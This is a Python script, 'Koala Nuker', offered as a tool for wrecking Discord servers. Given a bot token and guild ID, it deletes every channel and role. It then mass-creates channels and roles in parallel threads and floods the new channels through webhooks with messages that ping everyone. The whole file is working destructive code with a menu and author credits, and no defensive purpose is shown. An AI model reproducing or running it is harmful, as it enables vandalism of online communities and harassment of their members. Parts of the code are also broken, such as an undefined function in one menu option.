import os
os.system("pip install requests")
import requests
import threading
import time
import random

black = "\033[1;30m"
red = "\033[1;31m"    
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"    
purple = "\033[1;35m"    
cyan = "\033[1;36m"    
white = "\033[1;37m"    

colors = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"]

def FetchChannels(guild):
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{guild}/channels", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return r.json()
            else:
                break

def loadroles(guild):
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{guild}/roles", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            print(r.json())
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                
                return r.json()
            else:
                break

def removechan(chnl):
    while True:
        r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                break
            else:
                break

def removerole(guild, role):
    while True:
        r = requests.delete(f"https://discord.com/api/v10/guilds/{guild}/roles/{role}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                break
            else:
                break

def loadchannels(guild, name):
    while True:
        json = {'name': name, 'type': 0}
        r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return r.json()['id']
            else:
                break

def webhook(chnl):
    while True:
        r = requests.post(f'https://discord.com/api/v10/channels/{chnl}/webhooks', headers=headers, json={'name': 'github.com/infamouskoala'})
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return r.json()['id'], r.json()['token']
            else:
                break

def sendmsgwithwebhook(message, id, token):
    while True:
        r = requests.post(f'https://discord.com/api/v10/webhooks/{id}/{token}', headers=headers, json={'content': message, "allowed_mentions": {"parse": ["everyone"]}})
        if 'retry_after' in r.text:
            print(f"webhook rate limit: {r.json()['retry_after']}")
            time.sleep(r.json()['retry_after'])

def makeandspam(srvrid, chnlname, msgg):
    channel_id = loadchannels(srvrid, chnlname)
    webhook_id, webhook_token = webhook(channel_id)
    sendmsgwithwebhook(msgg, webhook_id, webhook_token)

def makeroles(guild, name):
    while True:
        json = {'name': name}
        r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/roles', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                break
            else:
                break

os.system("cls || clear")
os.system("title Koala Nuker Public")

print(f"""
 ____  __.           .__            _______         __                 
|    |/ _|_________  |  | _____     \      \  __ __|  | __ ___________ 
|      < /  _ \__  \ |  | \__  \    /   |   \|  |  \  |/ // __ \_  __ /
|    |  (  <_> ) __ \|  |__/ __ \_ /    |    \  |  /    <\  ___/|  | \/
|____|__ \____(____  /____(____  / \____|__  /____/|__|_ \/___  >__|   
        \/         \/          \/          \/           \/    \/
""")
guildid = int(input("Guild ID: "))
token = input("Bot Token: ")
headers = {'authorization': f'Bot {token}'}

while True:
    os.system("clear || cls")
    print(f"""
 ____  __.           .__            _______         __                 
|    |/ _|_________  |  | _____     \      \  __ __|  | __ ___________ 
|      < /  _ \__  \ |  | \__  \    /   |   \|  |  \  |/ // __ \_  __ /
|    |  (  <_> ) __ \|  |__/ __ \_ /    |    \  |  /    <\  ___/|  | \/
|____|__ \____(____  /____(____  / \____|__  /____/|__|_ \/___  >__|   
        \/         \/          \/          \/           \/    \/    

{green}[+]{white} Login Successful
{green}[KOALA NUKER]{white} This tool is made by github.com/infamouskoala

[0] Fast Nuke           [1] Delete Channels
[2] Create Channels     [3] Delete Roles
[4] Create Roles        [5] Contact us

Choice: """, end="")
    option = int(input())
    if option == 0:

        print(f"{red}[!]{white} QuickNuke Mode")
        msgint = input("Enter message: ")
        names = input("Channel Names: ")
        spammessage = f"{msgint}\nmade by https://github.com/infamouskoala"

        print(f"{green}[+]{white} Deleting existing channels")
        guild_channels = FetchChannels(guildid)
        for channel in guild_channels:
            t = threading.Thread(target=removechan, args=(channel['id'],))
            t.start()

        time.sleep(1)
    
        for k in range(30):
            t = threading.Thread(target=makeandspam, args=(guildid, names, spammessage))
            t.start()
        
        while True:
            colorchoirce = random.choice(colors)
            print(f"{colorchoirce}[KOALA NUKER]{white} Koala Nuker {colorchoirce}[KOALA NUKER]{white}", end="\r")

    elif option == 1:
        print(f"{green}[+]{white} Deleting channels")
        guild_channels = FetchChannels(guildid)
        for channel in guild_channels:
            t = threading.Thread(target=removechan, args=(channel['id'],))
            t.start()

    elif option == 2:
        name = input("Name: ")
        print(f"{green}[+]{white} Creating channels")
        for _ in range(20):
            t = threading.Thread(target=channel, args=(guildid, name,))
            t.start()

    elif option == 3:
        print(f"{green}[+]{white} Removing Roles")
        guild_roles = loadroles(guildid)
        for role in guild_roles:
            t = threading.Thread(target=removerole, args=(guildid, role['id'],))
            t.start()

    elif option == 4:
        name = input("Role Name: ")
        print(f"Creating Roles..")
        for _ in range(20): # might change to 50, refer to discord ratelimit docs
            t = threading.Thread(target=makeroles, args=(guildid, name,))
            t.start()

    elif option == 5:
        print(f"""
{green}[+]{white} Thank you for using Koala Nuker <3 
Coded with love by Infamous Koala <3
YouTube = https://youtube.com/infamouskoala
GitHub = https://github.com/infamouskoala

{yellow} Press any key to continue {white}
""")
        input()
